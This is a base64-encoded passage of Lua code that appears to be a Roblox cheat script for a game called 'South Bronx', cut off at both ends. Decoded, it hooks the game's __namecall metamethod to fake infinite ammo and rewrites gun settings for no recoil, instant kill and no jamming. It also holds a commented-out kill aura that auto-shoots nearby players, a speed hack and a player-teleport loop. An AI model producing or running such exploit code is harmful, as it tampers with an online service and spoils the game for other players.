CAgICAgICAgICAgICAgICAgIE1vZHVsZVNldHRpbmdzLkVxdWlwcGluZ1RpbWUgPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5RXF1aXBTcGVlZCBhbmQgR2V0UGVyY2VudGFnZShPbGRDb25maWcuRXF1aXBwaW5nVGltZSwgQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLkVxdWlwU3BlZWQpIG9yIE9sZENvbmZpZy5FcXVpcHBpbmdUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZHVsZVNldHRpbmdzLlNwcmVhZFggPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5U3ByZWFkVmFsdWUgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLlNwcmVhZFgsIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5TcHJlYWRQZXJjZW50YWdlKSBvciBPbGRDb25maWcuU3ByZWFkWAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MuU3ByZWFkWSA9IENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5Nb2RpZnlTcHJlYWRWYWx1ZSBhbmQgR2V0UGVyY2VudGFnZShPbGRDb25maWcuU3ByZWFkWSwgQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLlNwcmVhZFBlcmNlbnRhZ2UpIG9yIE9sZENvbmZpZy5TcHJlYWRZCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MuUmVjb2lsID0gQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLk1vZGlmeVJlY29pbFZhbHVlIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5SZWNvaWwsIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5SZWNvaWxQZXJjZW50YWdlKSBvciBPbGRDb25maWcuUmVjb2lsCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MuU2hvdGd1bkVuYWJsZWQgPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuSW5zdGFudEtpbGwgYW5kIHRydWUgb3IgT2xkQ29uZmlnLlNob3RndW5FbmFibGVkCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MuQXV0byA9IENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5BdXRvbWF0aWMgb3IgT2xkQ29uZmlnLkF1dG8KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGVTZXR0aW5ncy5KYW1DaGFuY2UgPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuRGlzYWJsZUphbW1pbmcgYW5kIDAgb3IgT2xkQ29uZmlnLkphbUNoYW5jZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFN1Y2Nlc3MgYW5kIEVycm9yIH49IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJbR1VOIE1PRCBFUlJPUl0gOiIsIEVycm9yKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgbG9jYWwgTW9kV2VhcG9ucyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBmb3IgXywgV2VhcG9uIGluIG5leHQsIEdldEFsbFRvb2xzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgV2VhcG9uOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZFdlYXBvbihXZWFwb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIGxvY2FsIFNldFZhbHVlcyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBmb3IgXywgV2VhcG9uIGluIG5leHQsIEdldEFsbFRvb2xzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgV2VhcG9uOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE1vZHVsZSA9IFdlYXBvbjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIk1vZHVsZVNjcmlwdCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTW9kdWxlIGFuZCBNb2R1bGUuTmFtZSA9PSAiU2V0dGluZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZHVsZSA9IHJlcXVpcmUoTW9kdWxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHlwZShNb2R1bGUpID09ICJ0YWJsZSIgYW5kIG5vdCBPbGRXZWFwb25WYWx1ZXNbV2VhcG9uLk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPbGRXZWFwb25WYWx1ZXNbV2VhcG9uLk5hbWVdID0ge30KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgT2xkQ29uZmlnID0gT2xkV2VhcG9uVmFsdWVzW1dlYXBvbi5OYW1lXQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIG5leHQsIE1vZHVsZSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPbGRDb25maWdbSW5kZXhdID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpIGVuZAoKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5DaGlsZEFkZGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oV2VhcG9uKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBXZWFwb246SXNBKCJUb29sIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIFdlYXBvbjpGaW5kRmlyc3RDaGlsZCgiU2V0dGluZyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgQ3VycmVudEd1bkhlbGQgPSBXZWFwb24KICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgU2V0VmFsdWVzKCk7IE1vZFdlYXBvbihXZWFwb24pOwogICAgICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oV2VhcG9uKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBXZWFwb246SXNBKCJUb29sIikgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgV2VhcG9uOkZpbmRGaXJzdENoaWxkKCJTZXR0aW5nIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBDdXJyZW50R3VuSGVsZCA9IFdlYXBvbgogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBTZXRWYWx1ZXMoKTsgTW9kV2VhcG9uKFdlYXBvbik7CiAgICAgICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oQ2hhcmFjdGVyKQogICAgICAgICAgICAgICAgICAgIENoYXJhY3Rlci5DaGlsZEFkZGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oV2VhcG9uKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgV2VhcG9uOklzQSgiVG9vbCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgV2VhcG9uOkZpbmRGaXJzdENoaWxkKCJTZXR0aW5nIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3VycmVudEd1bkhlbGQgPSBXZWFwb24KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIFNldFZhbHVlcygpOyBNb2RXZWFwb24oV2VhcG9uKTsKICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkQWRkZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihXZWFwb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBXZWFwb246SXNBKCJUb29sIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBXZWFwb246RmluZEZpcnN0Q2hpbGQoIlNldHRpbmciKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDdXJyZW50R3VuSGVsZCA9IFdlYXBvbgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIFNldFZhbHVlcygpOyBNb2RXZWFwb24oV2VhcG9uKTsKICAgICAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIGxvY2FsIENvbmZpZ01ldGF0YWJsZSA9IGdldG1ldGF0YWJsZShDb25maWcuU291dGhfQnJvbnguTW9kaWZpY2F0aW9ucykKCiAgICAgICAgICAgICAgICBDb25maWdNZXRhdGFibGUuX19pbmRleCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgICAgICAgICByZXR1cm4gQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zW3NlbGVjdCgyLCAuLi4pXQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgICAgICAgICAgQ29uZmlnTWV0YXRhYmxlLl9fbmV3aW5kZXggPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgSW5kZXgsIFZhbHVlID0gc2VsZWN0KDIsIC4uLikKICAgICAgICAKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnNbSW5kZXhdID0gVmFsdWU7IE1vZFdlYXBvbnMoKQogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIC0tW1tsb2NhbCBPbGRHdW5TZXR0aW5nc0hvb2sgOyBPbGRHdW5TZXR0aW5nc0hvb2sgPSBob29rbWV0YW1ldGhvZChnYW1lLCAiX19uYW1lY2FsbCIsIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFNlbGYsIC4uLikKICAgICAgICAgICAgICAgICAgICBpZiBDdXJyZW50R3VuSGVsZCA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gT2xkR3VuU2V0dGluZ3NIb29rKFNlbGYsIC4uLikKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgZ2V0bmFtZWNhbGxtZXRob2QoKSA9PSAiRmlyZVNlcnZlciIgb3IgZ2V0bmFtZWNhbGxtZXRob2QoKSA9PSAiSW52b2tlU2VydmVyIiBhbmQgQ3VycmVudEd1bkhlbGQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBBcmd1bWVudHMgPSB7Li4ufQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBBcmd1bWVudHMgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHR5cGVvZihWYWx1ZSkgPT0gInRhYmxlIiBhbmQgcmF3Z2V0KFZhbHVlICwgIkFtbW8iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUgPSBPbGRXZWFwb25WYWx1ZXNbQ3VycmVudEd1bkhlbGQuTmFtZV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gT2xkR3VuU2V0dGluZ3NIb29rKFNlbGYsIHVucGFjayhBcmd1bWVudHMpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHJldHVybiBPbGRHdW5TZXR0aW5nc0hvb2soU2VsZiwgLi4uKQogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBPbGRNYWdBbmRBbW1vOyBPbGRNYWdBbmRBbW1vID0gaG9va21ldGFtZXRob2QoZ2FtZSwgIl9fbmFtZWNhbGwiLCBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihTZWxmLCAuLi4pCiAgICAgICAgICAgICAgICAgICAgaWYgQ3VycmVudEd1bkhlbGQgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE9sZE1hZ0FuZEFtbW8oU2VsZiwgLi4uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGdldG5hbWVjYWxsbWV0aG9kKCkgPT0gIkZpcmVTZXJ2ZXIiIG9yIGdldG5hbWVjYWxsbWV0aG9kKCkgPT0gIkludm9rZVNlcnZlciIgYW5kIHRvc3RyaW5nKFNlbGYpID09ICJDaGFuZ2VNYWdBbmRBbW1vIiBhbmQgKENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gb3IgQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLkluZmluaXRlQ2xpcHMpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQXJndW1lbnRzID0gey4uLn0KICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXJndW1lbnRzWzJdID0gT2xkV2VhcG9uVmFsdWVzW0N1cnJlbnRHdW5IZWxkLk5hbWVdLkFtbW9QZXJNYWcKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gT2xkTWFnQW5kQW1tbyhTZWxmLCB1bnBhY2soQXJndW1lbnRzKSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE9sZE1hZ0FuZEFtbW8oU2VsZiwgLi4uKQogICAgICAgICAgICAgICAgZW5kKSldXQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIC0tW1tpZiBub3QgU29sYXJhIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIERlbGV0ZUNoYXRQbGF5ZXIgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihQbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgaWYgUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEhlYWQgPSBQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgSGVhZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBIZWFkOkZpbmRGaXJzdENoaWxkKCJjaGF0cGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkOkZpbmRGaXJzdENoaWxkKCJjaGF0cGFydCIpOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihDaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkhlYWQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgQ2hhcmFjdGVyLkhlYWQ6V2FpdEZvckNoaWxkKCJjaGF0cGFydCIpOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFBsYXllcnM6R2V0UGxheWVycygpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgRGVsZXRlQ2hhdFBsYXllcihWYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChEZWxldGVDaGF0UGxheWVyKQogICAgICAgICAgICBlbmRdXQoKICAgICAgICAgICAgLS1bW2xvY2FsIEZpcmVGdW5jLCBGaXJlRnVuY3MgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICByZXR1cm4gLi4uCiAgICAgICAgICAgIGVuZCksIHt9CgogICAgICAgICAgICBsb2NhbCBSZWZyZXNoRmlyZUZ1bmMgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIGdldGdjKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB0eXBlb2YoVmFsdWUpID09ICJmdW5jdGlvbiIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBJbmZvID0gZGVidWcuZ2V0aW5mbyhWYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5mby5zb3VyY2UgPT0gc3RyaW5nLmZvcm1hdCgiPVBsYXllcnMuJXMuUGxheWVyU2NyaXB0cy5NYWluLk1vZHVsZXMuR3VuU2NyaXB0X0xvY2FsIiwgTG9jYWxQbGF5ZXIuTmFtZSkgYW5kIG5vdCB0YWJsZS5maW5kKEZpcmVGdW5jcywgVmFsdWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVGdW5jID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChGaXJlRnVuY3MsIEZpcmVGdW5jKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBSZWZyZXNoRmlyZUZ1bmMoKQoKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoNSkKICAgICAgICAgICAgICAgIFJlZnJlc2hGaXJlRnVuYygpCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBTaG9vdFBsYXllciA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFBsYXllcikKICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiAKICAgICAgICAgICAgICAgICAgICByZXR1cm4gCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIFRvb2wgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIik7IGxvY2FsIEhhbmRsZSA9IFRvb2w6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCgogICAgICAgICAgICAgICAgaWYgbm90IFRvb2w6RmluZEZpcnN0Q2hpbGQoIlNldHRpbmdzIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoUGxheWVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBQbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFBsYXllcikKCiAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyLkNoYXJhY3RlciBvciBub3QgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIG5vdCBQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIG9yIFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIik6R2V0U3RhdGUoKSA9PSBFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkRlYWQgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgbm90IEZpcmVGdW5jIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZWZyZXNoRmlyZUZ1bmMoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcHJpbnQoIkZpcmVkIikKCiAgICAgICAgICAgICAgICBGaXJlRnVuYyhUb29sLCBIYW5kbGUsIFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKS5Qb3NpdGlvbikKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoMC4xKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuU291dGhfQnJvbnguS2lsbEF1cmEgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKTpGaW5kRmlyc3RDaGlsZCgiU2V0dGluZyIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBQbGF5ZXJzOkdldFBsYXllcnMoKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0YWJsZS5maW5kKENvbmZpZy5Tb3V0aF9Ccm9ueC5LaWxsQXVyYVdoaXRlbGlzdCwgdG9zdHJpbmcoVmFsdWUpKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZSA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWUuQ2hhcmFjdGVyIG9yIG5vdCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIG9yIG5vdCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpLkhlYWx0aCA9PSAwIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkZvcmNlRmllbGQiKSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IERpc3RhbmNlQ2hlY2soVmFsdWUsIENvbmZpZy5Tb3V0aF9Ccm9ueC5LaWxsQXVyYVJhbmdlKSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgU2hvb3RQbGF5ZXIoVmFsdWUuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKV1dCgogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBEZWx0YSA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OldhaXQoKQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNvdXRoX0Jyb254LkxvY2FsUGxheWVyX0NvbmZpZy5TcGVlZCB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uLk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgU3BlZWRGYWN0b3IgPSAoSHVtYW5vaWQuV2Fsa1NwZWVkID49IDEwKSBhbmQgMSBvciAwLjU0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6VHJhbnNsYXRlQnkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWQuTW92ZURpcmVjdGlvbiAqIENvbmZpZy5Tb3V0aF9Ccm9ueC5Mb2NhbFBsYXllcl9Db25maWcuU3BlZWRWYWx1ZSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqIERlbHRhICogMTAgKiBTcGVlZEZhY3RvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLkJyaW5naW5nUGxheWVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgdG9zdHJpbmcoQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikgPT0gdG9zdHJpbmcoTG9jYWxQbGF5ZXIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm